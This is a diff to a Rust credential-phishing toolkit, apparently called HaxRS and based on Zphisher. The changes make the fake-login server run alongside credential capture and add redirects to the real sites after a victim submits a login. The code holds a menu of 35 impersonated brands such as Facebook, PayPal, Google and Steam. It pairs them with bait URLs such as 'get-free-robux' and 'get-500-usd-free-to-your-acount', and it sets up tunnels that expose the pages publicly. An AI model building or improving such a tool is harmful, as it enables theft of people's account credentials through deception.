@@ -19,6 +19,7 @@ use zip::ZipArchive;
 use rayon::prelude::*;
 use regex::Regex;
 use reqwest::header::USER_AGENT;
+use futures::try_join;
 use crate::errors::TerminalError;
 use crate::web_server::start_webserver;
 
@@ -99,6 +100,7 @@ pub fn banner_small() {
     println!("{}", BANNER.cyan());
     println!("HaxRS Version: {}", VERSION.bold());
     println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
+println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
     println!();
 }
 
@@ -106,7 +108,7 @@ pub fn banner_small() {
 pub fn kill_pid() {
     log::info!("Killing processes");
     use sysinfo::{ProcessExt, System, SystemExt};
-    let processes_to_kill = vec![
+    let processes_to_kill = [
         "php.exe",
         "cloudflared-windows-amd64.exe",
         "loclx.exe",
@@ -130,7 +132,7 @@ pub fn kill_pid() {
 
 #[cfg(target_os = "linux")]
 pub fn kill_pid() {
-    let processes_to_kill = vec!["php", "cloudflared", "loclx"];
+    let processes_to_kill = ["php", "cloudflared", "loclx"];
     let procs = match procfs::process::all_processes() {
         Ok(p) => p,
         Err(e) => {
@@ -275,7 +277,7 @@ pub fn install_dependencies() {
         }.join(BIN_PATH),
     );
 
-    let download_links: Vec<&str> = get_download_urls();
+    let download_links: [&str; 2] = get_download_urls();
     if files_exist(&bin_path) {
         return;
     }
@@ -326,16 +328,15 @@ pub fn install_dependencies() {
     });
 }
 
-pub fn custom_port_input() -> Result<u16, TerminalError> {
+pub fn custom_port_input() -> Result<Option<u16>, TerminalError> {
     loop {
-        print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] : ".cyan(), String::new().white());
+        print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] (empty = 8080) : ".cyan(), String::new().white());
         stdout().flush()?;
         let mut selection = String::new();
         stdin().read_line(&mut selection)?;
         selection = selection.trim().to_string();
-        if selection.is_empty() {
-            log::error!("No input");
-            error_msg("Empty input");
+        return if selection.is_empty() {
+            Ok(None)
         } else {
             // turn this into a match statement
             let num: u16 = match selection.parse::<u16>() {
@@ -346,14 +347,13 @@ pub fn custom_port_input() -> Result<u16, TerminalError> {
                     continue;
                 }
             };
-
             if !(1024..=9999).contains(&num) {
                 log::error!("Not in range");
                 error_msg("Not in range");
                 continue;
             }
-            return Ok(num);
-        }
+            Ok(Some(num))
+        };
     }
 }
 
@@ -382,54 +382,54 @@ pub fn site_input() -> Result<u16, TerminalError> {
 }
 
 
-pub fn site_selection<'a>() -> (&'a str, Option<&'a str>) {
+pub fn site_selection<'a>() -> (&'a str, Option<&'a str>, Option<&'a str>) {
     loop {
         let selection = match site_input() {
             Ok(s) => s,
             Err(e) => {
                 log::error!("Failed to get site input: {}", e);
                 error_msg(&format!("Failed to get site input: {}", e));
-                return ("", None);
+                return ("", None, None);
             }
         };
         match selection {
-            1 => return ("facebook", None),
-            2 => return ("instagram", None),
-            3 => return ("google", None),
-            4 => return ("microsoft", Some("https://unlimited-onedrive-space-for-free")),
-            5 => return ("netflix", Some("https://upgrade-your-netflix-plan-free")),
-            6 => return ("paypal", Some("https://get-500-usd-free-to-your-acount")),
-            7 => return ("steam", Some("https://steam-500-usd-gift-card-free")),
-            8 => return ("twitter", Some("https://get-blue-badge-on-twitter-free")),
-            9 => return ("playstation", Some("https://playstation-500-usd-gift-card-free")),
-            10 => return ("tiktok", Some("https://tiktok-free-liker")),
-            11 => return ("twitch", Some("https://unlimited-twitch-tv-user-for-free")),
-            12 => return ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free")),
-            13 => return ("snapchat", Some("https://view-locked-snapchat-accounts-secretly")),
-            14 => return ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free")),
-            15 => return ("ebay", Some("https://get-500-usd-free-to-your-acount")),
-            16 => return ("quora", Some("https://quora-premium-for-free")),
-            17 => return ("protonmail", Some("https://protonmail-pro-basics-for-free")),
-            18 => return ("spotify", Some("https://convert-your-account-to-spotify-premium")),
-            19 => return ("reddit", Some("https://reddit-official-verified-member-badge")),
-            20 => return ("adobe", Some("https://get-adobe-lifetime-pro-membership-free")),
-            21 => return ("deviantart", Some("https://get-500-usd-free-to-your-acount")),
-            22 => return ("badoo", Some("https://get-500-usd-free-to-your-acount")),
-            23 => return ("origin", Some("https://get-500-usd-free-to-your-acount")),
-            24 => return ("dropbox", Some("https://get-1TB-cloud-storage-free")),
-            25 => return ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free")),
-            26 => return ("wordpress", Some("https://unlimited-wordpress-traffic-free")),
-            27 => return ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free")),
-            28 => return ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free")),
-            29 => return ("vk", None),
-            30 => return ("xbox", Some("https://get-500-usd-free-to-your-acount")),
-            31 => return ("mediafire", Some("https://get-1TB-on-mediafire-free")),
-            32 => return ("gitlab", Some("https://get-1k-followers-on-gitlab-free")),
-            33 => return ("github", Some("https://get-1k-followers-on-github-free")),
-            34 => return ("discord", Some("https://get-discord-nitro-free")),
-            35 => return ("roblox", Some("https://get-free-robux")),
-            99 => return ("about", None),
-            0 => return ("exit", None),
+            1 => return ("facebook", None, Some("https://www.facebook.com/")),
+            2 => return ("instagram", None, Some("https://www.instagram.com/")),
+            3 => return ("google", None, Some("https://www.google.com/")),
+            4 => return ("microsoft", Some("https://unlimited-onedrive-space-for-free"), Some("https://www.microsoft.com/")),
+            5 => return ("netflix", Some("https://upgrade-your-netflix-plan-free"), Some("https://www.netflix.com/")),
+            6 => return ("paypal", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.paypal.com/")),
+            7 => return ("steam", Some("https://steam-500-usd-gift-card-free"), Some("https://store.steampowered.com/")),
+            8 => return ("twitter", Some("https://get-blue-badge-on-twitter-free"), Some("https://twitter.com/")),
+            9 => return ("playstation", Some("https://playstation-500-usd-gift-card-free"), Some("https://www.playstation.com/")),
+            10 => return ("tiktok", Some("https://tiktok-free-liker"), Some("https://www.tiktok.com/")),
+            11 => return ("twitch", Some("https://unlimited-twitch-tv-user-for-free"), Some("https://www.twitch.tv/")),
+            12 => return ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free"), Some("https://www.pinterest.com/")),
+            13 => return ("snapchat", Some("https://view-locked-snapchat-accounts-secretly"), Some("https://www.snapchat.com/")),
+            14 => return ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free"), Some("https://www.linkedin.com/")),
+            15 => return ("ebay", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.ebay.com/")),
+            16 => return ("quora", Some("https://quora-premium-for-free"), Some("https://www.quora.com/")),
+            17 => return ("protonmail", Some("https://protonmail-pro-basics-for-free"), Some("https://protonmail.com/")),
+            18 => return ("spotify", Some("https://convert-your-account-to-spotify-premium"), Some("https://www.spotify.com/")),
+            19 => return ("reddit", Some("https://reddit-official-verified-member-badge"), Some("https://www.reddit.com/")),
+            20 => return ("adobe", Some("https://get-adobe-lifetime-pro-membership-free"), Some("https://www.adobe.com/")),
+            21 => return ("deviantart", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.deviantart.com/")),
+            22 => return ("badoo", Some("https://get-500-usd-free-to-your-acount"), Some("https://badoo.com/")),
+            23 => return ("origin", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.origin.com/")),
+            24 => return ("dropbox", Some("https://get-1TB-cloud-storage-free"), Some("https://www.dropbox.com/")),
+            25 => return ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free"), Some("https://www.yahoo.com/")),
+            26 => return ("wordpress", Some("https://unlimited-wordpress-traffic-free"), Some("https://wordpress.com/")),
+            27 => return ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free"), Some("https://yandex.com/")),
+            28 => return ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free"), Some("https://stackoverflow.com/")),
+            29 => return ("vk", None, Some("https://vk.com/")),
+            30 => return ("xbox", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.xbox.com/")),
+            31 => return ("mediafire", Some("https://get-1TB-on-mediafire-free"), Some("https://www.mediafire.com/")),
+            32 => return ("gitlab", Some("https://get-1k-followers-on-gitlab-free"), Some("https://gitlab.com/")),
+            33 => return ("github", Some("https://get-1k-followers-on-github-free"), Some("https://github.com/")),
+            34 => return ("discord", Some("https://get-discord-nitro-free"), Some("https://discord.com/")),
+            35 => return ("roblox", Some("https://get-free-robux"), Some("https://www.roblox.com/")),
+            99 => return ("about", None, None),
+            0 => return ("exit", None, None),
             _ => {
                 log::error!("Invalid selection");
                 error_msg("Invalid selection, Please try again");
@@ -439,22 +439,23 @@ pub fn site_selection<'a>() -> (&'a str, Option<&'a str>) {
 }
 
 
-pub async fn start_localhost(site: &str) -> Result<(), TerminalError> {
-    let custom_port: u16 = custom_port_input()?;
-    log::info!("Starting localhost on port {}", custom_port);
-    println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
-    setup_site(site).await?;
-    clear_terminal()?;
-    banner_small();
-    println!("{} ({})", "Successfully Hosted at : ".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
-    capture_data()?;
+pub async fn start_localhost(site: &str, redirect_url: String) -> Result<(), TerminalError> {
+    let custom_port: Option<u16> = custom_port_input()?;
+    log::info!("Starting localhost on port {}", custom_port.unwrap_or(PORT));
+    println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port.unwrap_or(PORT)).cyan());
+
+    let setup_future = setup_site(site, custom_port, redirect_url);
+    let capture_future = capture_data();
+
+    try_join!(setup_future, capture_future)?;
     Ok(())
 }
 
-pub async fn tunnel_menu(site: &str) -> Result<(), TerminalError> {
+pub async fn tunnel_menu(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     clear_terminal()?;
     banner_small();
-    let servers = vec![
+    println!("Selected: {}\n", site.cyan());
+    let servers = [
         ("01", "Localhost", None),
         ("02", "Cloudflared", Some("Auto Detects")),
         ("03", "LocalXpose", Some("NEW! Max 15Min")),
@@ -468,8 +469,9 @@ pub async fn tunnel_menu(site: &str) -> Result<(), TerminalError> {
             None => println!("{} {}", colorized_id, colorized_server),
         }
     }
+
     println!();
-    tunnel_selection(site).await?;
+    tunnel_selection(site, redirect_url).await?;
 
     Ok(())
 }
@@ -504,12 +506,12 @@ pub fn get_input_string(msg: &str) -> Result<String, TerminalError> {
 }
 */
 
-pub async fn tunnel_selection(site: &str) -> Result<(), TerminalError> {
+pub async fn tunnel_selection(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     loop {
         let selection: u32 = get_input_number("Select a tunnel: ")?;
         match selection {
-            1 => return start_localhost(site).await,
-            2 => return start_cloudflared(site).await,
+            1 => return start_localhost(site, redirect_url).await,
+            2 => return start_cloudflared(site, redirect_url).await,
             3 => {
                 error_msg("Not implemented yet");
                 continue;
@@ -524,10 +526,8 @@ pub async fn tunnel_selection(site: &str) -> Result<(), TerminalError> {
 }
 
 
-pub async fn setup_site(site: &str) -> Result<(), TerminalError> {
+pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> Result<(), TerminalError> {
     log::info!("Setting up site");
-
-
     println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
     // change into .server directory
     let sites_dir = get_sites_dir().unwrap_or_else(|| {
@@ -536,15 +536,9 @@ pub async fn setup_site(site: &str) -> Result<(), TerminalError> {
         exit(1);
     });
     let site_dir = sites_dir.join(site);
-    dbg!(&sites_dir);
-    dbg!(&site_dir);
-
-    start_webserver(site_dir).await?;
-    clear_terminal()?;
-    banner_small();
-    println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
-
-
+    // dbg!(&sites_dir);
+    // dbg!(&site_dir);
+    start_webserver(site_dir, port, redirect_url).await?;
     Ok(())
 }
 
@@ -632,7 +626,7 @@ fn capture_creds() -> Result<(), TerminalError> {
     Ok(())
 }
 
-pub fn capture_data() -> Result<(), TerminalError> {
+pub async fn capture_data() -> Result<(), TerminalError> {
     println!("{} {}", "Waiting for Login Info, Ctrl + C to exit...".yellow(), "Please wait".cyan());
     let ip_txt = match get_server_dir() {
         Some(s) => s,
@@ -695,7 +689,7 @@ fn get_cldflr_url() -> Result<String, TerminalError> {
 }
 
 
-pub async fn start_cloudflared(site: &str) -> Result<(), TerminalError> {
+pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     // remove ".cld.log" file if exists
     let cld_log = match get_server_dir() {
         Some(s) => s,
@@ -716,12 +710,13 @@ pub async fn start_cloudflared(site: &str) -> Result<(), TerminalError> {
             }
         }
     }
-    setup_site(site).await?;
-    let cus_port: u16 = custom_port_input()?;
+    let cus_port: Option<u16> = custom_port_input()?;
+    setup_site(site, cus_port, redirect_url).await?;
+
     #[cfg(target_os = "windows")]
     {
         let mut cmd = Command::new("cmd");
-        cmd.arg("/c").arg("cloudflared").arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port)).arg("--logfile").arg(".cld.log");
+        cmd.arg("/c").arg("cloudflared").arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log");
         cmd.spawn()?;
         sleep(Duration::from_secs(8));
         let url = get_cldflr_url()?;
@@ -748,7 +743,7 @@ pub async fn start_cloudflared(site: &str) -> Result<(), TerminalError> {
 pub async fn main_menu() -> Result<(), TerminalError> {
     clear_terminal()?;
     banner();
-    let services: Vec<(&str, (u8, u8, u8))> = vec![
+    let services = [
         ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
         ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
         ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
@@ -779,16 +774,15 @@ pub async fn main_menu() -> Result<(), TerminalError> {
     println!("{}) {:<15} ", "99".red(), "About".bright_blue());
     println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
     println!();
-    let sel: (&str, Option<&str>) = site_selection();
-    if sel.1.is_some() {
-        tunnel_menu(sel.0).await?;
+    let sel: (&str, Option<&str>, Option<&str>) = site_selection();
+    if sel.1.is_some() || sel.2.is_some() {
+        tunnel_menu(sel.0, sel.2.unwrap_or("").to_string()).await?;
     }
-    println!("signaled: {0} | {1}", sel.0, sel.1.unwrap_or("None"));
+    // println!("signaled: {0} | {1}", sel.0, sel.1.unwrap_or("None"));
     Ok(())
 }
 
-// TODO: Fix clear terminal.
-// TODO: Use Actix-web instead of PHP.
+
 // TODO: Add LocalXPose Auth.
 // TODO: Add Start with LocalXPose.
 // TODO: Add URL shortener/masking.
